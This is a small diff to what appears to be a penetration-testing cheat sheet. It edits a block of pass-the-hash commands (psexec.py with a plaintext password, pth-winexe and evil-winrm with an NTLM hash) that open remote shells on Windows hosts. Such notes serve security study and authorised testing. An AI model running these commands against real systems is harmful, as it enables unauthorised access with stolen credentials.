@@ -194,7 +194,7 @@ psexec.py alice:ThisIsTheUsersPassword01@10.11.1.50 cmd.exe
 
 pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
 
-(evil-winrm -u Administrator -H 2892d26cdf84d7a70e2eb3b9f05c425e  -i 192.168.177.10)
+evil-winrm -u Administrator -H 2892d26cdf84d7a70e2eb3b9f05c425e  -i 192.168.177.10
 ```
 
 ## Over Pass The Hash
